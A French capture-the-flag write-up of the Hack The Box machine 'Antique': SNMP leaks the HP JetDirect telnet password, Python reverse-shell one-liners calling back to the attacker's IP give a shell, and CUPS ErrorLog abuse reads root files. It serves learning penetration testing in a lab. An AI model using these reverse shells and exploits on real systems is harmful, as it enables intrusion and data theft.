**Box Antique sur HTB**

**Enumération:**
```
nmap -sS -sV -p- 10.10.11.107
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-19 12:38 CEST
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 21.79% done; ETC: 12:39 (0:00:18 remaining)
Nmap scan report for 10.10.11.107
Host is up (0.041s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
23/tcp open  telnet?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
nmap -sS -sV -p- 10.10.11.107
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-19 12:38 CEST
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 21.79% done; ETC: 12:39 (0:00:18 remaining)
Nmap scan report for 10.10.11.107
Host is up (0.041s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
23/tcp open  telnet?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.91%I=7%D=10/19%Time=616EA056%P=x86_64-pc-linux-gnu%r(NUL
SF:L,F,"\nHP\x20JetDirect\n\n")
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 191.89 seconds
```
```
# nmap -sU -sV 10.10.11.107
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-19 12:38 CEST
Stats: 0:15:50 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 98.22% done; ETC: 12:54 (0:00:17 remaining)                                                   
Nmap scan report for 10.10.1                                                                                         1.107                                                                                                                
Host is up (0.027s latency).                                                                                         
Not shown: 956 closed ports,                                                                                          43 open|filtered ports                                                                                              
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server (public)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1225.48 seconds
```

Nous détections une machine avec seulement un port telnet ouvert, et un inconnu. Telnet nous demande immédiatement un mot de passe. Un scan UDP sera nécessaire pour trouver le service inconnu. Celui ci étant un peu long on peu se renseigner sur le service HP trouvé ici, JetDirect.


**Exploitation**


Il existe plusieurs vulnérabilité sur celui ci, une d'entre elle utilisant snmp pour trouver le mot de passe utilisé par telnet. Le scan UDP confirmant que snmp est utilisé en public, cette faille est exploitable. Nous allons donc l'utiliser

```
snmpwalk -v 2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0                                       130 ⨯
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
```

Le serveur nous renvois ici le mot de passe d'administration à partir duquel nous pourrions nous connecter en hexa. Un petit script python pour le décoder fera l'affaire
```
#!/usr/bin/python3

Pass = "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135"

Pass = Pass.split()

PassD = ""

for x in Pass:
	PassD = PassD + chr(int(x,16))

print (PassD)
```
```
./python/rootme/DecToAscii.py 
P@ssw0rd@123!!123       ▒"#%&'01345789BCIPQTWXaetuyăĆđĔĕęĢģĦİıĴĵ
```

Nous avons le mot de passe! Maintenant, connectons nous à telnet. En le faisant nous voyons qu'il est possible d'executer des commandes et que le repertoire contiens un script python. On va donc pouvoir executer un reverse shell en python

```
telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
> exec exec python3 -c'importsocket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.1                                                                                                                    
> exec python3 -c'importsocket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
> exec ls
telnet.py
user.txt
> exec python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",1235));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```
nc -lvnp 4242
listening on [any] 4242 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.107] 37834
$ id
id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
```

Nous sommes connecté en tant que lp, un utilisateur crée pour gérer les imprimantes sur linux. Le flag utilisateur est présent ici et permet de valider la premiére partie de cette box.


**Elevation de privilège**


Pour continuer, j'upload le script linpeas dans le répertoire tmp, puis l'execute et ouvre un serveur http temporaire avec python pour récupérer le scan. La procédure peu etre trouvé ici

https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

Dans le rapport de scan, deux choses attire mon attention, CUPS est executé en tant que root et peu être utilisé comme vecteur d'escalade de privilége, et le port 631 est en écoute.

De nombreuses recherche plus tard j'arrive à faire un port forwarding vers ma machine du port 631 en utilisant socat. Je tombe sur une erreur Bad request de la part de CUPS.

https://book.hacktricks.xyz/tunneling-and-port-forwarding

```
socat TCP-LISTEN:9000,fork TCP:127.0.0.1:631 &

# ensuite aller sur l'ip de la box sur le port 631 donne l'erreur bad request et la version de CUPS 1.6.1
```

A partir d'ici j'ai tenté plusieurs choses: utiliser d'autre outils de port forwarding, utiliser le module de post exploitation cups de metasploit, aucun d'entre eux n'a fonctionné pour me donner accés à la page de cups.

Quelques recherches sur les vulnérabilité de CUPS m'ont ammené sur ce lien et à l'exploit suivant

https://vulners.com/metasploit/MSF:POST/MULTI/ESCALATE/CUPS_ROOT_FILE_READ

```
cupsctl ErrorLog="/root/root.txt"   # spécifie le fichier qu'on veux voir

$ curl http://localhost:631/admin/log/error_log?  # passe par l'interface admin sur le port 631 pour voir le fichier a travers l'error log
curl http://localhost:631/admin/log/error_log?
```

Et voilà, box terminée. Apès un peu plus de recherche, il semble que ma version de chisel avait été compilée avec des librairies différentes de celle qu'utilisais la box. Un membre de HTB m'a donné une version propre qui à fonctionnée et qui m'a permis d'accéder à l'interface de CUPS dans mon navigateur comme le proposais le write up du site.

Cette Box m'aura permis d'en apprendre beaucoup plus sur le port forwarding, et encore une fois démontré que l'énumération est importante une fois sur la machine pour avoir le plus d'informations possible.
